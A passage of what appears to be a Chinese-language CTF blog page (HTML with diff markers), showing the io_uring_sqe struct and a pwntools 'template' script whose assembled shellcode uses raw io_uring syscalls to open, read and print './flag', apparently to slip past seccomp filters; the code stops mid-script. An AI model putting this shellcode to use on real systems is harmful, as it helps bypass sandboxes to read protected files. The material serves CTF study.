+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">           <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">            * IO submission data structure (Submission Queue Entry)
+</span></span></span><span class="line"><span class="cl"><span class="cm">            */</span>
+</span></span><span class="line"><span class="cl">           <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">__u8</span> <span class="n">opcode</span><span class="p">;</span>        <span class="cm">/* type of operation for this sqe */</span>
+</span></span><span class="line"><span class="cl">                <span class="n">__u8</span> <span class="n">flags</span><span class="p">;</span>         <span class="cm">/* IOSQE_ flags */</span>
+</span></span><span class="line"><span class="cl">                <span class="n">__u16</span>     <span class="n">ioprio</span><span class="p">;</span>        <span class="cm">/* ioprio for the request */</span>
+</span></span><span class="line"><span class="cl">                <span class="n">__s32</span>     <span class="n">fd</span><span class="p">;</span>       <span class="cm">/* file descriptor to do IO on */</span>
+</span></span><span class="line"><span class="cl">                <span class="k">union</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u64</span>     <span class="n">off</span><span class="p">;</span> <span class="cm">/* offset into file */</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u64</span>     <span class="n">addr2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                          <span class="n">__u32</span>     <span class="n">cmd_op</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                          <span class="n">__u32</span>     <span class="n">__pad1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="p">};</span>
+</span></span><span class="line"><span class="cl">                <span class="p">};</span>
+</span></span><span class="line"><span class="cl">                <span class="k">union</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u64</span>     <span class="n">addr</span><span class="p">;</span>     <span class="cm">/* pointer to buffer or iovecs */</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u64</span>     <span class="n">splice_off_in</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                          <span class="n">__u32</span>     <span class="n">level</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                          <span class="n">__u32</span>     <span class="n">optname</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="p">};</span>
+</span></span><span class="line"><span class="cl">                <span class="p">};</span>
+</span></span><span class="line"><span class="cl">                <span class="n">__u32</span>     <span class="n">len</span><span class="p">;</span>      <span class="cm">/* buffer size or number of iovecs */</span>
+</span></span><span class="line"><span class="cl">                <span class="k">union</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__kernel_rwf_t</span> <span class="n">rw_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">fsync_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u16</span>          <span class="n">poll_events</span><span class="p">;</span>   <span class="cm">/* compatibility */</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">poll32_events</span><span class="p">;</span> <span class="cm">/* word-reversed for BE */</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">sync_range_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">msg_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">timeout_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">accept_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">cancel_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">open_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">statx_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">fadvise_advice</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">splice_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">rename_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">unlink_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">hardlink_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">xattr_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">msg_ring_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">uring_cmd_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">waitid_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">futex_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">install_fd_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>          <span class="n">nop_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">};</span>
+</span></span><span class="line"><span class="cl">                <span class="n">__u64</span>     <span class="n">user_data</span><span class="p">;</span>     <span class="cm">/* data to be passed back at completion time */</span>
+</span></span><span class="line"><span class="cl">                <span class="cm">/* pack this to avoid bogus arm OABI complaints */</span>
+</span></span><span class="line"><span class="cl">                <span class="k">union</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                     <span class="cm">/* index into fixed buffers, if used */</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u16</span>     <span class="n">buf_index</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="cm">/* for grouped buffer selection */</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u16</span>     <span class="n">buf_group</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">                <span class="cm">/* personality to use, if used */</span>
+</span></span><span class="line"><span class="cl">                <span class="n">__u16</span>     <span class="n">personality</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">union</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__s32</span>     <span class="n">splice_fd_in</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>     <span class="n">file_index</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u32</span>     <span class="n">optlen</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                          <span class="n">__u16</span>     <span class="n">addr_len</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                          <span class="n">__u16</span>     <span class="n">__pad3</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                     <span class="p">};</span>
+</span></span><span class="line"><span class="cl">                <span class="p">};</span>
+</span></span><span class="line"><span class="cl">                <span class="k">union</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                     <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                          <span class="n">__u64</span>     <span class="n">addr3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                          <span class="n">__u64</span>     <span class="n">__pad2</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                     <span class="p">};</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u64</span>     <span class="n">optval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                     <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">                      * If the ring is initialized with IORING_SETUP_SQE128, then
+</span></span></span><span class="line"><span class="cl"><span class="cm">                      * this field is used for 80 bytes of arbitrary command data
+</span></span></span><span class="line"><span class="cl"><span class="cm">                      */</span>
+</span></span><span class="line"><span class="cl">                     <span class="n">__u8</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="p">};</span>
+</span></span><span class="line"><span class="cl">           <span class="p">};</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><h3 class="heading-element" id="模板"><span>模板</span>
+  <a href="#%e6%a8%a1%e6%9d%bf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-python"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="3" style="--fi-max-shown-lines:10;--fi-line-digit:3;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    rsp+0x100   0x078: struct io_uring_params params = </span><span class="si">{}</span><span class="s2">;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    rsp+0x200   0x008: uring_fd
+</span></span></span><span class="line"><span class="cl"><span class="s2">    rsp+0x208   0x008: sq_ring ptr
+</span></span></span><span class="line"><span class="cl"><span class="s2">    rsp+0x210   0x008: cq_ring ptr
+</span></span></span><span class="line"><span class="cl"><span class="s2">    rsp+0x218   0x008: sqes ptr
+</span></span></span><span class="line"><span class="cl"><span class="s2">    rsp+0x220   0x008: flag_fd
+</span></span></span><span class="line"><span class="cl"><span class="s2">    rsp+0x300   0x100: buffer
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">/*视情况调整栈帧*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add rsp, 0x2000
+</span></span></span><span class="line"><span class="cl"><span class="s2">/*int uring_fd = syscall(SYS_io_uring_setup, 16, &amp;params);*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">    lea rdi, [rsp+0x100]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rcx, 15
+</span></span></span><span class="line"><span class="cl"><span class="s2">    rep stosq
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, 16
+</span></span></span><span class="line"><span class="cl"><span class="s2">    lea rsi, [rsp+0x100]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0x1a9
+</span></span></span><span class="line"><span class="cl"><span class="s2">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">/*unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rsp+0x200], rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor rdi, rdi
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rsi, 0x1000
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdx, 3
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r10, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r8, qword ptr [rsp+0x200]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r9, 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 9
+</span></span></span><span class="line"><span class="cl"><span class="s2">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rsp+0x208], rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">/*unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor rdi, rdi
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rsi, 0x1000
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdx, 3
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r10, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r8, qword ptr [rsp+0x200]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r9, 0x8000000
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 9
+</span></span></span><span class="line"><span class="cl"><span class="s2">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rsp+0x210], rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">/*struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor rdi, rdi
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rsi, 0x1000
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdx, 3
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r10, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r8, qword ptr [rsp+0x200]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r9, 0x10000000
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 9
+</span></span></span><span class="line"><span class="cl"><span class="s2">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rsp+0x218], rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">/*openat*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x218]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rcx, 8
+</span></span></span><span class="line"><span class="cl"><span class="s2">    rep stosq
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x218]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov byte ptr [rdi], 18 	/*opcode*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov byte ptr [rdi+1], 0	/* IOSQE_ flags*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi+4], -100	/* file descriptor to do IO on */
+</span></span></span><span class="line"><span class="cl"><span class="s2">    /* 要打开文件的路径存放在 rsp+0x300 处 */
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0x67616c662f2e
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rsp+0x300], rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">    lea rax, [rsp+0x300]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rdi+16], rax /*pathname*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi+28], 0	/*open_flag*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x208]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, dword ptr [rsp+0x140]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add rdi, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi], 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x208]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, dword ptr [rsp+0x12c]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add rdi, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add dword ptr [rdi], 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x200]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rsi, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdx, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r10, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor r8, r8
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor r9, r9
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0x1aa
+</span></span></span><span class="line"><span class="cl"><span class="s2">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x210]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, dword ptr [rsp+0x164]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add rdi, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, dword ptr [rdi+8]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rsp+0x220], rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2"> /*read*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x218]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rcx, 8
+</span></span></span><span class="line"><span class="cl"><span class="s2">    rep stosq
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x218]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov byte ptr [rdi], 22
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, qword ptr [rsp+0x220]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi+4], eax
+</span></span></span><span class="line"><span class="cl"><span class="s2">    lea rax, [rsp+0x300]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rdi+16], rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi+24], 0x100
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x208]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, dword ptr [rsp+0x140]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add rdi, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi], 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x208]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, dword ptr [rsp+0x12c]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add rdi, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add dword ptr [rdi], 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x200]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rsi, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdx, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r10, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor r8, r8
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor r9, r9
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0x1aa
+</span></span></span><span class="line"><span class="cl"><span class="s2">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">/*write*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x218]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rcx, 8
+</span></span></span><span class="line"><span class="cl"><span class="s2">    rep stosq
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x218]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov byte ptr [rdi], 23
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi+4], 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    lea rax, [rsp+0x300]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rdi+16], rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi+24], 0x100
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x208]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, dword ptr [rsp+0x140]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add rdi, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi], 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x208]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, dword ptr [rsp+0x12c]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add rdi, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add dword ptr [rdi], 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x200]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rsi, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdx, 3
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r10, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor r8, r8
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor r9, r9
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0x1aa
+</span></span></span><span class="line"><span class="cl"><span class="s2">    syscall
